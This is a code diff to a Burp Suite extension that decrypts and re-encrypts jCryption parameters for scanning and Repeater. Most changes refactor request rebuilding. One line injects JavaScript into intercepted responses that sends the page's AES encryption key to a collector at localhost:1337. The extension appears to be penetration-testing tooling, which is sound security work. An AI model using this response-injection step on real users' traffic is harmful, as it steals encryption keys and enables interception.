@@ -437,10 +437,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 					byte[] encrypt = JCryption.encrypt(mainPassphrase, new String(decrypted));
 
 					// updateParameter 'data' value
-					String r = new String(request);
-					String r2 = r.replaceAll(d.getValue(), helpers.urlEncode(helpers.base64Encode(encrypt)));
+					IParameter d2 = helpers.buildParameter(mainParameter, helpers.urlEncode(helpers.base64Encode(encrypt)), d.getType());
+					byte[] request2 = helpers.updateParameter(request, d2);
 
-					callbacks.doActiveScan(iReqResp.getHttpService().getHost(), iReqResp.getHttpService().getPort(), iReqResp.getHttpService().getProtocol().equalsIgnoreCase("https"), helpers.stringToBytes(r2));
+					callbacks.doActiveScan(iReqResp.getHttpService().getHost(), iReqResp.getHttpService().getPort(), iReqResp.getHttpService().getProtocol().equalsIgnoreCase("https"), request2);
 				}
 			}
 
@@ -542,14 +542,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 					byte[] encrypt = JCryption.encrypt(mainPassphrase, new String(decrypted));
 
 					// updateParameter 'data' value
-					String r = new String(request);
-					String r2 = r.replaceAll(d.getValue(), helpers.urlEncode(helpers.base64Encode(encrypt)));
+					IParameter d2 = helpers.buildParameter(mainParameter, helpers.urlEncode(helpers.base64Encode(encrypt)), d.getType());
+					byte[] request2 = helpers.updateParameter(request, d2);
 
 					callbacks.sendToRepeater(
 							httpService.getHost(),
 							httpService.getPort(),
 							httpService.getProtocol().equalsIgnoreCase("https"),
-							helpers.stringToBytes(r2),
+							request2,
 							EXTENSION_NAME);
 				}
 			}
@@ -661,7 +661,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 						String replace = new String("setTimeout(function(){ success.call(this, AESEncryptionKey); }, 888); var x = new XMLHttpRequest(); x.open(\"GET\", \"https://localhost:1337/?p=\"+AESEncryptionKey, true); x.send();");
 						String response = new String(messageInfo.getResponse());
 
-						if (response.contains(match))
+						if (response.contains(match) && !response.contains(replace))
 						{
 							String r = response.replaceFirst(Pattern.quote(match), replace);
 							int bodyOffset = x.getBodyOffset();
@@ -699,17 +699,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 		// rebuild decrypted request
 		String param = helpers.bytesToString(decrypted);
 
-		String req_str = new String(req);
-		int bodyStart = req_str.lastIndexOf(mainParameter); // + 1
-		int len_a = bodyStart;
-		int len_b = param.length();
-
-		byte[] reqDecrypted = new byte[len_a + len_b];
-		System.arraycopy(req, 0, reqDecrypted, 0, len_a);
-		System.arraycopy(decrypted, 0, reqDecrypted, len_a, len_b);
+		IParameter d = helpers.buildParameter(mainParameter, param, dataParameter.getType());
+		byte[] req2 = helpers.updateParameter(req, d);
+		String req3 = helpers.bytesToString(req2).replaceAll(mainParameter+"=", "");
 
 		// retrieve request parameters
-		IRequestInfo requestInfo = helpers.analyzeRequest(reqDecrypted);
+		IRequestInfo requestInfo = helpers.analyzeRequest(helpers.stringToBytes(req3));
 		List<IParameter> requestParams = requestInfo.getParameters();
 
 		for (IParameter parameter : requestParams)
